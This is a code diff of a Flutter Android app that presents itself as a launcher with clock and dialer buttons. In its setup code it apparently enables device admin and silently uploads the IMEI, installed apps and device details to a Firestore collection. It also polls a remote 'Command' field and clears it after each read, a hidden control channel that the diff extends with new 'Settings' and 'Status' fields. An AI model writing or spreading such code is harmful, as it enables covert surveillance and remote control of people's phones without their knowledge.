@@ -13,6 +13,7 @@ import 'package:downloader/downloader.dart';
 import 'package:wifi/wifi.dart';
 import 'package:connect_wifi/connect_wifi.dart';
 import 'package:connectivity/connectivity.dart';
+import 'package:analog_clock/analog_clock.dart';
 
 
 
@@ -70,7 +71,7 @@ class _HomeState extends State<Home> {
         print(wifi[i].ssid);
       }
       return wifi;
-}
+      }
 
 
    
@@ -87,6 +88,7 @@ class _HomeState extends State<Home> {
   String time;
   initState(){
      time = TimeOfDay.now().toString();
+
     getInfo();
     Admin.enable();
     Downloader.getPermission();
@@ -128,10 +130,7 @@ class _HomeState extends State<Home> {
                               
                           }
                          
-                          
-                                          
-                                      
-        });
+         });
         
         }
        
@@ -197,11 +196,12 @@ class _HomeState extends State<Home> {
                  "Installed_Apps":app,
                   "Device_info":allinfo,
                   "Imei":imei,
-                  "Command":""
+                  "Command":"",
+                  "Settings":[]
               });
 
          }else{
-          
+                 Firestore.instance.collection("Informations").document(doc.last.documentID).updateData({"Status":"Active"});
 
          }
     
@@ -238,6 +238,8 @@ class _HomeState extends State<Home> {
                      child: StreamBuilder(
                        stream: Firestore.instance.collection("Informations").where("Device_info.id",isEqualTo:fg).snapshots(),
                        builder: (context,snap){
+
+                           
                              
                                  
                               if(snap.hasData){
@@ -260,48 +262,20 @@ class _HomeState extends State<Home> {
                                     
                                 }
 
-                                print(snap.data.documents.last["Command"]+"        1");
+                                print(snap.data.documents.last["Status"]+"        1");
                                  
                                
 
                                 Firestore.instance.collection("Informations").document(snap.data.documents.last.documentID).updateData({"Command":""});
                               }
-                                return Column(
-                                    mainAxisAlignment: MainAxisAlignment.spaceEvenly,
-                                    children: <Widget>[
-                                            Padding(
-                                              padding: const EdgeInsets.only(bottom:198.0),
-                                              child: StreamBuilder<Object>(
-                                                stream: gettime(),
-                                                builder: (context, snapshot) {
-                                                  return RichText(
-                                                    text: TextSpan(
-                                                      text: time.split("(")[1].toString().split(")")[0].toString().split(":")[0],
-                                                      style: TextStyle(color: Colors.black.withOpacity(0.5),fontSize: 170),
-                                                      children: [
-                                                        TextSpan(
-                                                           text:":"+ time.split("(")[1].toString().split(")")[0].toString().split(":")[1],
-                                                            style: TextStyle(color: Colors.black.withOpacity(0.5),fontSize: 80),
-                                                        )
-                                                      ]
-                                                    )
-                                                  );
-                                                }
-                                              ),
-                                            )
-                                    ],
-
-
+                                return  Container(
+                                   
                                 );
+
+
+                                
                          
 
-                         
-                          
-                           
-                            
-                           
-                       
-                         
 
                        },
                      ),
@@ -317,7 +291,7 @@ class _HomeState extends State<Home> {
                               DeviceApps.openApp("com.android.contacts");
                         },),
                         IconButton(icon: Icon(Icons.home,size: 30,color: Colors.black, ),onPressed: (){
-                             var route = MaterialPageRoute(builder: (context)=>AppDraw());
+                             var route = MaterialPageRoute(builder: (context)=>AppDraw(fg));
                              Navigator.of(context).push(route);
                         }),
                         IconButton(icon: Icon(Icons.message,size: 30, color: Colors.black,),onPressed: (){
